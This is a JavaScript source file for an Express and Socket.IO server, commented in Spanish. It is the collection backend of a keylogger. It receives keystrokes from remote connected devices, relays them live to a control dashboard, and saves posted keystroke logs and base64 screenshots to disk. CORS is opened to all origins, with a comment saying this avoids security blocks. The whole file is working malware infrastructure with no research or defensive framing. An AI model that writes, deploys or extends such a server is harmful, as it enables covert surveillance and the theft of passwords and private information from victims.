const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const os = require('os'); // Para obtener tu IP real automáticamente

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*" } // Evita bloqueos de seguridad
});
const PORT = process.env.PORT || 3001; // Render asigna el puerto mediante una variable de entorno

// --- CONFIGURACIÓN DE CARPETAS ---
const keyloggerSaveDir = path.join(__dirname, 'keylogger_logs');
try {
    if (!fs.existsSync(keyloggerSaveDir)) {
        fs.mkdirSync(keyloggerSaveDir, { recursive: true });
        console.log("Carpeta de logs creada exitosamente");
    }
} catch (err) {
    console.error("Error al crear carpeta de logs, usando directorio temporal:", err);
}

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Función para obtener tu IP local real
function getLocalIp() {
    const interfaces = os.networkInterfaces();
    for (let devName in interfaces) {
        let iface = interfaces[devName];
        for (let i = 0; i < iface.length; i++) {
            let alias = iface[i];
            if (alias.family === 'IPv4' && alias.address !== '127.0.0.1' && !alias.internal) {
                return alias.address;
            }
        }
    }
    return '127.0.0.1';
}

// --- RUTAS CORREGIDAS ---

// Esta ruta ahora coincide con lo que pide tu botón (según el error 404 visto antes)
app.get('/network', async (req, res) => {
  try {
    const myIp = getLocalIp(); // Asegúrate de que esta función esté definida
    const hosts = [myIp, "127.0.0.1"]; 
    console.log("Enviando hosts:", hosts);
    res.json(hosts); // Enviamos el array directamente
  } catch (error) {
    res.status(500).send("Error");
  }
});

// Ruta para guardar logs (POST)
app.post('/api/keylogger/save', (req, res) => {
  try {
    const logs = req.body.logs || [];
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const folderName = `keylogger-save-${timestamp}`;
    const saveFolder = path.join(keyloggerSaveDir, folderName);
    
    fs.mkdirSync(saveFolder, { recursive: true });

    let allText = '';
    logs.forEach((log, index) => {
      allText += `${log.timestamp || ''} - ${log.log || ''}\n`;
      if (log.capture) {
        const imgBuffer = Buffer.from(log.capture, 'base64');
        fs.writeFileSync(path.join(saveFolder, `snap_${index}.png`), imgBuffer);
      }
    });

    fs.writeFileSync(path.join(saveFolder, 'texto.txt'), allText);
    console.log(`💾 Logs guardados en: ${folderName}`);
    res.json({ status: 'saved', folder: folderName });
  } catch (error) {
    res.status(500).json({ error: 'Error al guardar logs' });
  }
});

// --- SOCKET.IO ---
io.on('connection', (socket) => {
  console.log('📡 Nuevo dispositivo conectado al socket:', socket.id);
  
  socket.on('keylogger-data', (data) => {
    console.log('⌨️ Recibiendo teclas de:', data.remoteIp);
    // Reenvía los datos al panel de control (Dashboard)
    io.emit('keylogger-log', data);
  });

  socket.on('disconnect', () => {
    console.log('🔌 Dispositivo desconectado');
  });
});

server.listen(PORT, () => {
  console.log(`\n🚀 SERVIDOR MAESTRO ACTIVO`);
  console.log(`----------------------------------`);
  console.log(`🌐 Panel: http://localhost:${PORT}/keylogger.html`);
  console.log(`📡 Socket: Puerto ${PORT}`);
  console.log(`----------------------------------\n`);
});